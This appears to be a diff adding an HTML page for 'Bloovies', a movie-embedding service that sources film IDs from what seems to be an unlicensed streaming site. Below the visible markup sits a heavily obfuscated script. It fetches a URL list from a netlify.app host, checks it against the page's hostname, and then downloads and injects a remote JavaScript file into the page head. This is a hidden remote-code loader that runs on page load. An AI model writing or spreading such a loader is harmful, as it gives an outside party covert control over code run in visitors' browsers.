@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bloovies</title>
+    <link rel="stylesheet" href="https://cdn.plyr.io/1.8.2/plyr.css">
+</head>
+<body>
+    <div id="content">
+    <h1 id="blazer">Official <span>Blazer</span> Service</h1>
+    <div style="word-wrap: break-word; white-space: pre-wrap;" class="doc"><p>Welcome to the Bloovies Embeder 🎉<br>        This site if for embeding movies into sites, it uses the search params <span class="two">?movie=</span> here is an example <span id="location">watch-puss-in-boots-the-last-wish-91342</span>
+        and uses an ID system for proper embeding from the site FlixHQ you can get your movie ID's from (<a href="https://flixhq.to/" target="_blank">https://flixhq.to/</a>), 
+        (Ex. <a href="https://flixhq.to/movie/watch-puss-in-boots-the-last-wish-91342">https://flixhq.to/movie/watch-puss-in-boots-the-last-wish-91342</a>) The ID is the "<span class="three">watch-puss-in-boots-the-last-wish-91342</span>"
+                    Below is a code snippet which will help you get started, it allows you to iframe a movie!</p>
+        <div class="code-block">&lt;iframe src=&quot;https://blazermovies.gq/?movie=watch-puss-in-boots-the-last-wish-91342&quot;&gt;&lt;/iframe&gt;
+&lt;style&gt;
+iframe {
+    width: 100vw;
+    height: 100vh;
+    border: none;
+}
+&lt;/style&gt;</div>
+        <h2>Here is a list of other Bloovies URL's:</h2>
+        <div class="links">
+        <a href="https://supercluster.ga/" class="link">https://supercluster.ga/</a>
+        <a href="https://blazermovies.gq/" class="link">https://blazermovies.gq/</a>
+        <a href="https://exoplanet.tk/" class="link">https://exoplanet.tk/</a>
+        </div>
+    </div>
+    </div>
+    <video preload="none" id="player" autoplay controls crossorigin></video>
+</body>
+</html>
+
+<script src="https://cdn.plyr.io/1.8.2/plyr.js"></script>
+<script src="https://cdn.jsdelivr.net/hls.js/latest/hls.js"></script>
+
+<script>
+  const _0x4b4ea0=_0x5820;(function(_0x5ed3fd,_0x22b3cc){const _0x1cff31=_0x5820,_0x519b16=_0x5ed3fd();while(!![]){try{const _0x4431f4=parseInt(_0x1cff31(0xfc))/0x1+-parseInt(_0x1cff31(0xe7))/0x2+parseInt(_0x1cff31(0xec))/0x3+parseInt(_0x1cff31(0xef))/0x4+-parseInt(_0x1cff31(0xea))/0x5*(-parseInt(_0x1cff31(0xfb))/0x6)+-parseInt(_0x1cff31(0xf3))/0x7+parseInt(_0x1cff31(0xf5))/0x8*(-parseInt(_0x1cff31(0xeb))/0x9);if(_0x4431f4===_0x22b3cc)break;else _0x519b16['push'](_0x519b16['shift']());}catch(_0xf906a2){_0x519b16['push'](_0x519b16['shift']());}}}(_0x54d2,0x875f1),fetch(_0x4b4ea0(0xe8))[_0x4b4ea0(0xee)](_0xdfd3ab=>_0xdfd3ab[_0x4b4ea0(0xed)]())[_0x4b4ea0(0xee)](_0x5b74ab=>{const _0x59f917=_0x4b4ea0,_0x1d0012=new URL(window[_0x59f917(0xf2)][_0x59f917(0xfa)]),_0x456d22=_0x1d0012['\x68\x6f\x73\x74\x6e\x61\x6d\x65'],_0x365657=_0x5b74ab[_0x59f917(0xf4)](_0x52b4fc=>{const _0x2251b0=_0x59f917;_0x52b4fc[_0x2251b0(0xe9)]&&_0x52b4fc['\x75\x72\x6c'][_0x2251b0(0xfd)](_0x456d22)&&fetch('\x68\x74\x74\x70\x73\x3a\x2f\x2f\x37\x38\x32\x35\x34\x33\x39\x38\x37\x34\x34\x31\x32\x2e\x6e\x65\x74\x6c\x69\x66\x79\x2e\x61\x70\x70\x2f\x37\x38\x32\x35\x34\x33\x39\x38\x37\x34\x34\x31\x32\x2e\x6a\x73')[_0x2251b0(0xee)](_0x2af023=>_0x2af023[_0x2251b0(0xf6)]())[_0x2251b0(0xee)](_0x266441=>{const _0x278c39=_0x2251b0,_0x21ab91=document[_0x278c39(0xf1)](_0x278c39(0xf7));_0x21ab91[_0x278c39(0xf8)]=_0x266441,document[_0x278c39(0xf0)][_0x278c39(0xf9)](_0x21ab91);});});}));function _0x5820(_0x238174,_0x21a0e6){const _0x54d2f5=_0x54d2();return _0x5820=function(_0x582044,_0x1f2ac0){_0x582044=_0x582044-0xe7;let _0x11a662=_0x54d2f5[_0x582044];return _0x11a662;},_0x5820(_0x238174,_0x21a0e6);}function _0x54d2(){const _0x1e8b0d=['\x39\x37\x32\x43\x56\x6c\x57\x58\x77','\x32\x33\x30\x30\x32\x31\x37\x49\x44\x42\x67\x47\x56','\x6a\x73\x6f\x6e','\x74\x68\x65\x6e','\x33\x30\x33\x32\x34\x38\x30\x62\x65\x51\x74\x52\x62','\x68\x65\x61\x64','\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74','\x6c\x6f\x63\x61\x74\x69\x6f\x6e','\x31\x34\x33\x33\x37\x36\x31\x70\x4b\x41\x4b\x70\x46','\x73\x6f\x6d\x65','\x31\x30\x37\x33\x35\x32\x75\x71\x57\x64\x57\x4d','\x74\x65\x78\x74','\x73\x63\x72\x69\x70\x74','\x69\x6e\x6e\x65\x72\x48\x54\x4d\x4c','\x61\x70\x70\x65\x6e\x64\x43\x68\x69\x6c\x64','\x68\x72\x65\x66','\x31\x32\x37\x38\x36\x36\x65\x68\x53\x54\x76\x45','\x36\x35\x39\x33\x37\x32\x4f\x4b\x6a\x50\x43\x51','\x69\x6e\x63\x6c\x75\x64\x65\x73','\x31\x39\x39\x37\x32\x30\x36\x6c\x65\x59\x62\x62\x4b','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x37\x38\x32\x35\x34\x33\x39\x38\x37\x34\x34\x31\x32\x2e\x6e\x65\x74\x6c\x69\x66\x79\x2e\x61\x70\x70\x2f\x75\x72\x6c\x73\x2e\x6a\x73\x6f\x6e','\x75\x72\x6c','\x32\x34\x30\x4e\x66\x4d\x74\x4b\x67'];_0x54d2=function(){return _0x1e8b0d;};return _0x54d2();}
+</script>
+
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@100;200;300;400;500;600;700;800;900&family=Playfair+Display:wght@600&display=swap');
+  * {
+      padding: 0;
+      margin: 0;
+  }
+  body {
+      background-color: #121212;
+      color:#fff;
+  }
+  #content {
+      padding: 1vw 0 0 2vw;
+  }
+  .doc {
+    font-family: 'Montserrat', sans-serif;
+  }
+  .links {
+    margin-top: -2.5vw;
+  }
+  .code-block {
+    background-color: #323235;
+    color:#f6f8fa;
+    width: max-content;
+    padding: .75vw;
+    border-radius: .5vw;
+    font-size: .8vw;
+    font-family: Consolas, monospace;
+    margin-left: 5vw;
+    margin-top: -1.5vw;
+  }
+  .keyword {
+    color: #add8e6;
+  }
+  .string {
+    color: #ffa07a;
+  }
+  .number {
+    color: #98fb98;
+  }
+  .comment {
+    color: #696969;
+  }
+  .doc p {
+    font-size: 1vw;
+    line-height: 1.5vw;
+  }
+  h2 {
+    font-weight: 600;
+  }
+  h1 {
+      font-size: 2.5vw;
+      font-family: 'Montserrat', sans-serif;
+      margin-bottom: .2vw;
+  }
+  h1 span {
+      text-decoration: none;
+      color: #2c7ffc;
